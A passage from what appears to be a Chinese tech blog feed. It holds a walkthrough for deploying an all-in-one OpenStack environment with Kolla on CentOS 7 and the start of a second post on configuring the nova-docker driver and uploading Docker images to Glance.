        <content type="html"><![CDATA[<p>kolla项目是为了容器化openstack，目标是做到100个节点的开箱即用，所有的组件的HA都具备。kolla是一个革命性的项目，我们以前积累的安装部署经验，全部都报废。使用kolla可以快速部署可扩展，可靠的生产就绪的openstack环境。</p><h2 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h2><p>操作系统：CentOS Linux release 7.2.1511 (Core)<br>内核版本：3.10.0-327.28.3.el7.x86_64<br>docker版本：Docker version 1.12.1, build 23cf638</p><h2 id="部署kolla"><a href="#部署kolla" class="headerlink" title="部署kolla"></a>部署kolla</h2><h3 id="1-安装依赖"><a href="#1-安装依赖" class="headerlink" title="1. 安装依赖"></a>1. 安装依赖</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install epel-release python-pip</span><br><span class="line">yum install -y python-devel libffi-devel openssl-devel gcc</span><br><span class="line">pip install -U pip</span><br></pre></td></tr></table></figure><h3 id="2-修改docker启动文件"><a href="#2-修改docker启动文件" class="headerlink" title="2. 修改docker启动文件"></a>2. 修改docker启动文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Create the drop-in unit directory <span class="keyword">for</span> docker.service</span></span><br><span class="line">mkdir -p /etc/systemd/system/docker.service.d</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Create the drop-in unit file</span></span><br><span class="line">tee /etc/systemd/system/docker.service.d/kolla.conf &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">[Service]</span><br><span class="line">MountFlags=shared</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="3-重启docker"><a href="#3-重启docker" class="headerlink" title="3. 重启docker"></a>3. 重启docker</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="4-安装docker的python库"><a href="#4-安装docker的python库" class="headerlink" title="4. 安装docker的python库"></a>4. 安装docker的python库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install python-docker-py</span><br><span class="line">or</span><br><span class="line">pip install -U docker-py</span><br></pre></td></tr></table></figure><h3 id="5-配置时间同步（此处略）"><a href="#5-配置时间同步（此处略）" class="headerlink" title="5. 配置时间同步（此处略）"></a>5. 配置时间同步（此处略）</h3><h3 id="6-禁用libvirt"><a href="#6-禁用libvirt" class="headerlink" title="6. 禁用libvirt"></a>6. 禁用libvirt</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl stop libvirtd.service</span><br><span class="line">systemctl disable libvirtd.service</span><br></pre></td></tr></table></figure><h3 id="7-安装ansible"><a href="#7-安装ansible" class="headerlink" title="7. 安装ansible"></a>7. 安装ansible</h3><p>这里需要注意的是如果安装stable版的kolla需要Ansible &lt; 2.0，master版需要Ansible &gt; 2.0。默认yum安装ansible版本&gt;2.0，因为我要安装stable/mitaka版，所有指定安装版本。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install -U ansible==1.9.4</span><br></pre></td></tr></table></figure><h3 id="8-安装stable版kolla"><a href="#8-安装stable版kolla" class="headerlink" title="8. 安装stable版kolla"></a>8. 安装stable版kolla</h3><ul><li><p>下载源码</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://git.openstack.org/openstack/kolla -b stable/mitaka</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install -r kolla/requirements.txt -r kolla/test-requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>源码安装</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install kolla/</span><br></pre></td></tr></table></figure></li></ul><h3 id="9-安装tox，生成配置文件"><a href="#9-安装tox，生成配置文件" class="headerlink" title="9. 安装tox，生成配置文件"></a>9. 安装tox，生成配置文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install -U tox</span><br><span class="line">cd kolla/</span><br><span class="line">tox -e genconfig</span><br><span class="line">cp -rv etc/kolla /etc/</span><br></pre></td></tr></table></figure><h3 id="10-安装python-client"><a href="#10-安装python-client" class="headerlink" title="10. 安装python client"></a>10. 安装python client</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install python-openstackclient python-neutronclient</span><br></pre></td></tr></table></figure><h3 id="11-本地docker仓库"><a href="#11-本地docker仓库" class="headerlink" title="11. 本地docker仓库"></a>11. 本地docker仓库</h3><p>all-in-one环境中本地仓库不是必须的这里没有配置</p><h2 id="编译镜像"><a href="#编译镜像" class="headerlink" title="编译镜像"></a>编译镜像</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kolla-build</span><br></pre></td></tr></table></figure><p>更多的编译选项可以参看<a href="http://docs.openstack.org/developer/kolla/image-building.html">：Building Container Images</a><br>如果个别镜像编译失败可以重新执行以上操作，因为docker的容器缓存，重新编译会很快<br>编译成功后生成的镜像如下所示：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker images</span></span><br><span class="line">REPOSITORY                                      TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">kolla/centos-binary-heat-engine                 2.0.3               28956cc878d3        20 hours ago        571.4 MB</span><br><span class="line">kolla/centos-binary-heat-api-cfn                2.0.3               d69858fd13fa        20 hours ago        571.4 MB</span><br><span class="line">kolla/centos-binary-heat-api                    2.0.3               90a92ca6b71a        20 hours ago        571.4 MB</span><br><span class="line">kolla/centos-binary-heat-base                   2.0.3               8f1cf8a1f536        21 hours ago        551.6 MB</span><br><span class="line">kolla/centos-binary-neutron-openvswitch-agent   2.0.3               e7d0233ca541        21 hours ago        822.3 MB</span><br><span class="line">kolla/centos-binary-neutron-base                2.0.3               8767569ca9b3        21 hours ago        796.7 MB</span><br><span class="line">kolla/centos-binary-openvswitch-vswitchd        2.0.3               6867586ae335        21 hours ago        330.6 MB</span><br><span class="line">kolla/centos-binary-openvswitch-db-server       2.0.3               3c692f316662        21 hours ago        330.6 MB</span><br><span class="line">kolla/centos-binary-openvswitch-base            2.0.3               c3a263463f8f        21 hours ago        330.6 MB</span><br><span class="line">kolla/centos-binary-cron                        2.0.3               d16d53e85ed9        26 hours ago        317.5 MB</span><br><span class="line">kolla/centos-binary-kolla-toolbox               2.0.3               1fd9634b88ee        26 hours ago        568.4 MB</span><br><span class="line">kolla/centos-binary-heka                        2.0.3               627a3de5e91c        26 hours ago        371.1 MB</span><br><span class="line">kolla/centos-binary-neutron-metadata-agent      2.0.3               aad43ed7a5a1        42 hours ago        796.7 MB</span><br><span class="line">kolla/centos-binary-neutron-server              2.0.3               bc1a7c0ec402        42 hours ago        796.7 MB</span><br><span class="line">kolla/centos-binary-nova-compute                2.0.3               619344ac721b        42 hours ago        1.055 GB</span><br><span class="line">kolla/centos-binary-nova-libvirt                2.0.3               6144729fff5f        42 hours ago        1.106 GB</span><br><span class="line">kolla/centos-binary-neutron-linuxbridge-agent   2.0.3               720c9c5fa63d        42 hours ago        822 MB</span><br><span class="line">kolla/centos-binary-neutron-l3-agent            2.0.3               3a82df7cb9c2        42 hours ago        796.7 MB</span><br><span class="line">kolla/centos-binary-glance-api                  2.0.3               fb67115357d5        42 hours ago        673.8 MB</span><br><span class="line">kolla/centos-binary-neutron-dhcp-agent          2.0.3               8c6fa56497ca        42 hours ago        796.7 MB</span><br><span class="line">kolla/centos-binary-nova-compute-ironic         2.0.3               6f235dc430e5        43 hours ago        1.019 GB</span><br><span class="line">kolla/centos-binary-glance-registry             2.0.3               f4cf7bc1536f        43 hours ago        673.8 MB</span><br><span class="line">kolla/centos-binary-cinder-volume               2.0.3               0197cc13468d        43 hours ago        788.4 MB</span><br><span class="line">kolla/centos-binary-cinder-api                  2.0.3               ed7c623e7364        43 hours ago        800.4 MB</span><br><span class="line">kolla/centos-binary-cinder-rpcbind              2.0.3               75466dc5a3ba        43 hours ago        790.2 MB</span><br><span class="line">kolla/centos-binary-horizon                     2.0.3               92c7ea9fc493        43 hours ago        703.1 MB</span><br><span class="line">kolla/centos-binary-cinder-backup               2.0.3               e3ee19440831        43 hours ago        761.3 MB</span><br><span class="line">kolla/centos-binary-cinder-scheduler            2.0.3               e3ee19440831        43 hours ago        761.3 MB</span><br><span class="line">kolla/centos-binary-nova-consoleauth            2.0.3               96a9638801cd        43 hours ago        609.6 MB</span><br><span class="line">kolla/centos-binary-nova-api                    2.0.3               eff73f704a90        43 hours ago        609.4 MB</span><br><span class="line">kolla/centos-binary-nova-conductor              2.0.3               6016ae01a60d        43 hours ago        609.4 MB</span><br><span class="line">kolla/centos-binary-nova-scheduler              2.0.3               726f100a5533        43 hours ago        609.4 MB</span><br><span class="line">kolla/centos-binary-nova-spicehtml5proxy        2.0.3               c6a1a49e4226        43 hours ago        609.9 MB</span><br><span class="line">kolla/centos-binary-glance-base                 2.0.3               1e4efa0f6701        43 hours ago        673.8 MB</span><br><span class="line">kolla/centos-binary-nova-network                2.0.3               87f6389dd11a        43 hours ago        610.4 MB</span><br><span class="line">kolla/centos-binary-ironic-pxe                  2.0.3               82f25f73c28f        43 hours ago        574.2 MB</span><br><span class="line">kolla/centos-binary-nova-novncproxy             2.0.3               4726875ed228        43 hours ago        610.1 MB</span><br><span class="line">kolla/centos-binary-nova-ssh                    2.0.3               51c70b9e9c47        43 hours ago        610.4 MB</span><br><span class="line">kolla/centos-binary-cinder-base                 2.0.3               7c2d031be713        43 hours ago        761.3 MB</span><br><span class="line">kolla/centos-binary-keystone                    2.0.3               c51a93cc9e2e        43 hours ago        585.2 MB</span><br><span class="line">kolla/centos-binary-ironic-api                  2.0.3               b1771f5cc27f        43 hours ago        570.6 MB</span><br><span class="line">kolla/centos-binary-ironic-inspector            2.0.3               32f4e33e1037        43 hours ago        576.2 MB</span><br><span class="line">kolla/centos-binary-ironic-conductor            2.0.3               d552c64f3a08        43 hours ago        599 MB</span><br><span class="line">kolla/centos-binary-nova-base                   2.0.3               8f077fafc5d8        43 hours ago        588.7 MB</span><br><span class="line">kolla/centos-binary-rabbitmq                    2.0.3               d9e543e4f179        43 hours ago        370.3 MB</span><br><span class="line">kolla/centos-binary-ironic-base                 2.0.3               6c4c453ddbce        43 hours ago        550.8 MB</span><br><span class="line">kolla/centos-binary-openstack-base              2.0.3               cf48d5b3f3ee        43 hours ago        518.2 MB</span><br><span class="line">kolla/centos-binary-mariadb                     2.0.3               cd9b363fe034        43 hours ago        630.5 MB</span><br><span class="line">kolla/centos-binary-memcached                   2.0.3               49c536466427        43 hours ago        354.6 MB</span><br><span class="line">kolla/centos-binary-base                        2.0.3               d04ac1ecd01a        43 hours ago        300 MB</span><br><span class="line">centos                                          latest              980e0e4c79ec        2 days ago          196.7 MB</span><br></pre></td></tr></table></figure><h2 id="部署容器"><a href="#部署容器" class="headerlink" title="部署容器"></a>部署容器</h2><h3 id="1-生成密码"><a href="#1-生成密码" class="headerlink" title="1. 生成密码"></a>1. 生成密码</h3><p>openstack环境的密码等变量可以在 /etc/kolla/passwords.yml 中指定，为了方便可以使用kolla-genpwd工具自动生成复杂密码。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kolla-genpwd</span><br></pre></td></tr></table></figure><p>为了方便，我们修改其中的管理员登陆密码</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/kolla/passwords.yml</span><br><span class="line">keystone_admin_password: admin</span><br></pre></td></tr></table></figure><h3 id="2-修改部署配置文件"><a href="#2-修改部署配置文件" class="headerlink" title="2. 修改部署配置文件"></a>2. 修改部署配置文件</h3><p>修改/etc/kolla/globals.yml 文件，指定部署的一些信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/kolla/globals.yml</span><br><span class="line"></span><br><span class="line">kolla_base_distro: &quot;centos&quot;</span><br><span class="line">kolla_install_type: &quot;binary&quot;</span><br><span class="line">enable_haproxy: &quot;no&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash">kolla_internal_vip_address: <span class="string">&quot;10.10.10.254&quot;</span></span></span><br><span class="line">kolla_internal_address: &quot;192.168.2.120&quot;</span><br><span class="line">network_interface: &quot;ens160&quot;</span><br><span class="line">neutron_external_interface: &quot;ens192&quot;</span><br><span class="line">neutron_plugin_agent: &quot;openvswitch&quot;</span><br><span class="line">openstack_logging_debug: &quot;True&quot;</span><br></pre></td></tr></table></figure><h3 id="3-检查配置"><a href="#3-检查配置" class="headerlink" title="3. 检查配置"></a>3. 检查配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kolla-ansible prechecks</span><br></pre></td></tr></table></figure><h3 id="4-开始部署"><a href="#4-开始部署" class="headerlink" title="4. 开始部署"></a>4. 开始部署</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kolla-ansible deploy</span><br></pre></td></tr></table></figure><h3 id="5-部署成功后查看容器"><a href="#5-部署成功后查看容器" class="headerlink" title="5. 部署成功后查看容器"></a>5. 部署成功后查看容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker ps</span></span><br><span class="line">  CONTAINER ID        IMAGE                                                 COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">  3938136934cf        kolla/centos-binary-horizon:2.0.3                     &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             horizon</span><br><span class="line">  cc68cb8d96e4        kolla/centos-binary-heat-engine:2.0.3                 &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             heat_engine</span><br><span class="line">  96c94995ef7c        kolla/centos-binary-heat-api-cfn:2.0.3                &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             heat_api_cfn</span><br><span class="line">  cb8ae3afb767        kolla/centos-binary-heat-api:2.0.3                    &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             heat_api</span><br><span class="line">  e8f98659e03f        kolla/centos-binary-neutron-metadata-agent:2.0.3      &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             neutron_metadata_agent</span><br><span class="line">  d326fa732c2b        kolla/centos-binary-neutron-l3-agent:2.0.3            &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             neutron_l3_agent</span><br><span class="line">  4b1bbbe4fe5b        kolla/centos-binary-neutron-dhcp-agent:2.0.3          &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             neutron_dhcp_agent</span><br><span class="line">  88b2afbba5d9        kolla/centos-binary-neutron-openvswitch-agent:2.0.3   &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             neutron_openvswitch_agent</span><br><span class="line">  b73d52de75b2        kolla/centos-binary-neutron-server:2.0.3              &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             neutron_server</span><br><span class="line">  1c716402d95f        kolla/centos-binary-openvswitch-vswitchd:2.0.3        &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             openvswitch_vswitchd</span><br><span class="line">  176e7ee659f1        kolla/centos-binary-openvswitch-db-server:2.0.3       &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             openvswitch_db</span><br><span class="line">  457e0921c61a        kolla/centos-binary-nova-ssh:2.0.3                    &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             nova_ssh</span><br><span class="line">  b02acebb3dc3        kolla/centos-binary-nova-compute:2.0.3                &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             nova_compute</span><br><span class="line">  59be78a597d8        kolla/centos-binary-nova-libvirt:2.0.3                &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             nova_libvirt</span><br><span class="line">  668ad8f91920        kolla/centos-binary-nova-conductor:2.0.3              &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             nova_conductor</span><br><span class="line">  34f81b4bc18b        kolla/centos-binary-nova-scheduler:2.0.3              &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             nova_scheduler</span><br><span class="line">  eb47844e6547        kolla/centos-binary-nova-novncproxy:2.0.3             &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             nova_novncproxy</span><br><span class="line">  93563016cf21        kolla/centos-binary-nova-consoleauth:2.0.3            &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             nova_consoleauth</span><br><span class="line">  cc8a1cca2e98        kolla/centos-binary-nova-api:2.0.3                    &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             nova_api</span><br><span class="line">  40db89e89758        kolla/centos-binary-glance-api:2.0.3                  &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             glance_api</span><br><span class="line">  4fa5f0f38f0d        kolla/centos-binary-glance-registry:2.0.3             &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             glance_registry</span><br><span class="line">  f05120c95a9f        kolla/centos-binary-keystone:2.0.3                    &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             keystone</span><br><span class="line">  149a49d57aa6        kolla/centos-binary-rabbitmq:2.0.3                    &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             rabbitmq</span><br><span class="line">  5f4298c3821e        kolla/centos-binary-mariadb:2.0.3                     &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             mariadb</span><br><span class="line">  64f6fbb19892        kolla/centos-binary-cron:2.0.3                        &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             cron</span><br><span class="line">  4cab0e756b61        kolla/centos-binary-kolla-toolbox:2.0.3               &quot;/usr/local/bin/dumb-&quot;   17 hours ago        Up 17 hours                             kolla_toolbox</span><br><span class="line">  293a7ccaab52        kolla/centos-binary-heka:2.0.3                        &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             heka</span><br><span class="line">  6dcf3a2c12cc        kolla/centos-binary-memcached:2.0.3                   &quot;kolla_start&quot;            17 hours ago        Up 17 hours                             memcached</span><br></pre></td></tr></table></figure><h3 id="6-修改虚拟化类型"><a href="#6-修改虚拟化类型" class="headerlink" title="6. 修改虚拟化类型"></a>6. 修改虚拟化类型</h3><p>因为是在虚拟机中安装，不支持kvm，需要修改虚拟类型为qemu</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/kolla/nova-compute/nova.conf</span><br><span class="line"></span><br><span class="line">[libvirt]</span><br><span class="line">...</span><br><span class="line">virt_type=qemu</span><br></pre></td></tr></table></figure><p>然后就可以通过 kolla_internal_address 访问openstack环境<br><img data-src="/images/uploads/2016/09/20160909150758.png" alt="image"></p><h2 id="一些有用的工具"><a href="#一些有用的工具" class="headerlink" title="一些有用的工具"></a>一些有用的工具</h2><ol><li><p>部署完成后，运行以下命令可以生成一个openrc文件(运行openstack CLI所需的环境变量):</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kolla-ansible post-deploy</span><br></pre></td></tr></table></figure></li><li><p>openrc文件生成之后，使用以下命令可以帮你做一下openstack的初始化工作，包括上传一个glance镜像以及创建几个虚拟网络:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /etc/kolla/admin-openrc.sh</span><br><span class="line">kolla/tools/init-runonce</span><br></pre></td></tr></table></figure></li><li><p>由于错误的出现，可能需要多次的部署，而有些错误重新部署是不会进行修正的，所以需要将整个环境进行清理:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tools/cleanup-containers                #可用于从系统中移除部署的容器</span><br><span class="line">tools/cleanup-host                      #可用于移除由于残余网络变化引发的docker启动的neutron-agents主机</span><br><span class="line">tools/cleanup-images                    #可用于从本地缓存中移除所有的docker image</span><br></pre></td></tr></table></figure></li></ol><h2 id="日志查看"><a href="#日志查看" class="headerlink" title="日志查看"></a>日志查看</h2><p>kolla通过heka容器来收集所有容器的日志</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it heka bash</span><br></pre></td></tr></table></figure><p>所有的容器都可以从这个目录中获取服务日志：/var/log/kolla/SERVICE_NAME。<br>如果需要输出日志，请运行：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker logs</span><br></pre></td></tr></table></figure><p>大多数容器不会stdout，上面的命令将不会提供信息。</p><h2 id="出错处理"><a href="#出错处理" class="headerlink" title="出错处理"></a>出错处理</h2><p>deploy时遇到以下错误:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">TASK: [rabbitmq | fail msg=&quot;Hostname has to resolve to IP address of api_interface&quot;] ***</span><br><span class="line">failed: [localhost] =&amp;gt; (item=&#123;&#x27;cmd&#x27;: [&#x27;getent&#x27;, &#x27;ahostsv4&#x27;, &#x27;localhost&#x27;], &#x27;end&#x27;: &#x27;2016-06-24 04:51:39.738725&#x27;, &#x27;stderr&#x27;: u&#x27;&#x27;, &#x27;stdout&#x27;: &#x27;127.0.0.1       STREAM localhost\n127.0.0.1       DGRAM  \n127.0.0.1       RAW    \n127.0.0.1       STREAM \n127.0.0.1       DGRAM  \n127.0.0.1       RAW    &#x27;, &#x27;changed&#x27;: False, &#x27;rc&#x27;: 0, &#x27;item&#x27;: &#x27;localhost&#x27;, &#x27;warnings&#x27;: [], &#x27;delta&#x27;: &#x27;0:00:00.033351&#x27;, &#x27;invocation&#x27;: &#123;&#x27;module_name&#x27;: u&#x27;command&#x27;, &#x27;module_complex_args&#x27;: &#123;&#125;, &#x27;module_args&#x27;: u&#x27;getent ahostsv4 localhost&#x27;&#125;, &#x27;stdout_lines&#x27;: [&#x27;127.0.0.1       STREAM localhost&#x27;, &#x27;127.0.0.1       DGRAM  &#x27;, &#x27;127.0.0.1       RAW    &#x27;, &#x27;127.0.0.1       STREAM &#x27;, &#x27;127.0.0.1       DGRAM  &#x27;, &#x27;127.0.0.1       RAW    &#x27;], &#x27;start&#x27;: &#x27;2016-06-24 04:51:39.705374&#x27;&#125;) =&amp;gt; &#123;&quot;failed&quot;: true, &quot;item&quot;: &#123;&quot;changed&quot;: false, &quot;cmd&quot;: [&quot;getent&quot;, &quot;ahostsv4&quot;, &quot;localhost&quot;], &quot;delta&quot;: &quot;0:00:00.033351&quot;, &quot;end&quot;: &quot;2016-06-24 04:51:39.738725&quot;, &quot;invocation&quot;: &#123;&quot;module_args&quot;: &quot;getent ahostsv4 localhost&quot;, &quot;module_complex_args&quot;: &#123;&#125;, &quot;module_name&quot;: &quot;command&quot;&#125;, &quot;item&quot;: &quot;localhost&quot;, &quot;rc&quot;: 0, &quot;start&quot;: &quot;2016-06-24 04:51:39.705374&quot;, &quot;stderr&quot;: &quot;&quot;, &quot;stdout&quot;: &quot;127.0.0.1       STREAM localhost\n127.0.0.1       DGRAM  \n127.0.0.1       RAW    \n127.0.0.1       STREAM \n127.0.0.1       DGRAM  \n127.0.0.1       RAW    &quot;, &quot;stdout_lines&quot;: [&quot;127.0.0.1       STREAM localhost&quot;, &quot;127.0.0.1       DGRAM  &quot;, &quot;127.0.0.1       RAW    &quot;, &quot;127.0.0.1       STREAM &quot;, &quot;127.0.0.1       DGRAM  &quot;, &quot;127.0.0.1       RAW    &quot;], &quot;warnings&quot;: []&#125;&#125;</span><br><span class="line">msg: Hostname has to resolve to IP address of api_interface</span><br><span class="line"></span><br><span class="line">FATAL: all hosts have already failed -- aborting</span><br><span class="line"></span><br><span class="line">PLAY RECAP ********************************************************************</span><br><span class="line">to retry, use: --limit @/root/site.retry</span><br><span class="line"></span><br><span class="line">localhost                  : ok=87   changed=24   unreachable=0    failed=1</span><br></pre></td></tr></table></figure><p>解决办法：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line">127.0.0.1     localhost</span><br><span class="line">192.168.2.120 localhost</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> openstack </tag>
            
            <tag> kolla </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openstack 使用 nova docker driver</title>
      <link href="docker/openstack-use-nova-docker-driver.html"/>
      <url>docker/openstack-use-nova-docker-driver.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、安装docker并修改使用阿里云的镜像加速"><a href="#一、安装docker并修改使用阿里云的镜像加速" class="headerlink" title="一、安装docker并修改使用阿里云的镜像加速"></a>一、安装docker并修改使用阿里云的镜像加速</h2><p>以下操作在controller节点和compute节点进行（controller节点安装docker是为了方便下载docker镜像直接导入glance）</p><ol><li>创建yum repo文件（这里使用阿里云的源)</li></ol><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tee /etc/yum.repos.d/docker.repo &amp;lt;&amp;lt;-&#x27;EOF&#x27;</span></span><br><span class="line">[dockerrepo]</span><br><span class="line"><span class="attribute">name</span>=Docker Repository</span><br><span class="line"><span class="attribute">baseurl</span>=http://mirrors.aliyun.com/docker-engine/yum/repo/main/centos/7/</span><br><span class="line"><span class="attribute">enabled</span>=1</span><br><span class="line"><span class="attribute">gpgcheck</span>=1</span><br><span class="line"><span class="attribute">gpgkey</span>=http://mirrors.aliyun.com/docker-engine/yum/gpg</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><ol start="2"><li>安装docker</li></ol><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install docker-engine</span></span><br></pre></td></tr></table></figure><ol start="3"><li>修改docker使用阿里云镜像加速</li></ol><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># cp -n <span class="regexp">/lib/</span>systemd<span class="regexp">/system/</span>docker.service <span class="regexp">/etc/</span>systemd<span class="regexp">/system/</span>docker.service</span><br><span class="line"># sed -i <span class="string">&quot;s|ExecStart=/usr/bin/dockerd|ExecStart=/usr/bin/dockerd --registry-mirror=https://dhxb****.mirror.aliyuncs.com|g&quot;</span> <span class="regexp">/etc/</span>systemd<span class="regexp">/system/</span>docker.service</span><br><span class="line"># systemctl daemon-reload</span><br></pre></td></tr></table></figure><span id="more"></span><p>上文 <a href="https://dhxb****.mirror.aliyuncs.com/">https://dhxb****.mirror.aliyuncs.com</a> 是我的加速器地址，获取自己加速地址请参考阿里云：<a href="https://cr.console.aliyun.com/#/accelerator">https://cr.console.aliyun.com/#/accelerator</a></p><ol start="4"><li>启动docker并设置开机自启</li></ol><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl enable docker</span></span><br><span class="line"><span class="meta"># systemctl start docker</span></span><br></pre></td></tr></table></figure><h2 id="二、在compute节点安装并配置novadocker"><a href="#二、在compute节点安装并配置novadocker" class="headerlink" title="二、在compute节点安装并配置novadocker"></a>二、在compute节点安装并配置novadocker</h2><ol><li>安装novadocker</li></ol><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># usermod -aG docker nova</span></span><br><span class="line"><span class="meta"># yum -y install git python-pip</span></span><br><span class="line"><span class="meta"># pip install -e git+https://github.com/openstack/nova-docker#egg=novadocker</span></span><br><span class="line"><span class="meta"># cd src/novadocker/</span></span><br><span class="line"><span class="meta"># python setup.py install</span></span><br></pre></td></tr></table></figure><ol start="2"><li>配置 /etc/nova/nova.conf 使用docker driver</li></ol><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="attr">compute_driver</span> = novadocker.virt.docker.DockerDriver</span><br><span class="line"></span><br><span class="line"><span class="section">[docker]</span></span><br><span class="line"><span class="comment"># Commented out. Uncomment these if you&#x27;d like to customize:</span></span><br><span class="line"><span class="comment">## vif_driver=novadocker.virt.docker.vifs.DockerGenericVIFDriver</span></span><br><span class="line"><span class="comment">## snapshots_directory=/var/tmp/my-snapshot-tempdir</span></span><br></pre></td></tr></table></figure><p>将/src/novadocker/etc/nova/rootwrap.d/docker.filters文件拷贝到/etc/nova/rootwrap.d/docker.filters，并修改rootwrap.d的访问权限，然后启动nova-compute服务</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># cp -R <span class="regexp">/src/</span>novadocker<span class="regexp">/etc/</span>nova<span class="regexp">/rootwrap.d /</span>etc<span class="regexp">/nova/</span></span><br><span class="line"># chown -R root:nova <span class="regexp">/etc/</span>nova/rootwrap.d # systemctl restart openstack-nova-compute</span><br></pre></td></tr></table></figure><h2 id="三、上传镜像到glacne"><a href="#三、上传镜像到glacne" class="headerlink" title="三、上传镜像到glacne"></a>三、上传镜像到glacne</h2><ol><li>在glance的配置文件中启用driver</li></ol><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/glance/glance-api.conf</span></span><br><span class="line"><span class="section">[image_format]</span></span><br><span class="line"><span class="attr">container_formats</span> = ami,ari,aki,bare,ovf,docker</span><br></pre></td></tr></table></figure><ol start="2"><li>重启glance-api服务</li></ol><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># openstack-sevice restart glance</span></span><br></pre></td></tr></table></figure><ol start="3"><li>获取docker镜像，并上传到glance中</li></ol><figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line"># docker pull cirros</span><br><span class="line"># docker <span class="keyword">save</span> cirros | glance image-create --container-<span class="keyword">format</span>=docker --disk-<span class="keyword">format</span>=raw --<span class="keyword">name</span> cirros</span><br></pre></td></tr></table></figure><h2 id="四、创建docker-instance"><a href="#四、创建docker-instance" class="headerlink" title="四、创建docker instance"></a>四、创建docker instance</h2><ol><li>创建实例</li></ol><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"># nova boot --image cirros --flavor m1.tiny --nic net-id=59cc6a1d<span class="string">-0</span>cc1<span class="string">-44</span>c7<span class="string">-8</span>b0a<span class="string">-9</span>dc071fde397 cirros-docker</span><br></pre></td></tr></table></figure><ol start="2"><li>使用docker命令查看容器</li></ol><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker ps</span></span><br><span class="line"><span class="attribute">CONTAINER</span> ID IMAGE COMMAND CREATED STATUS PORTS 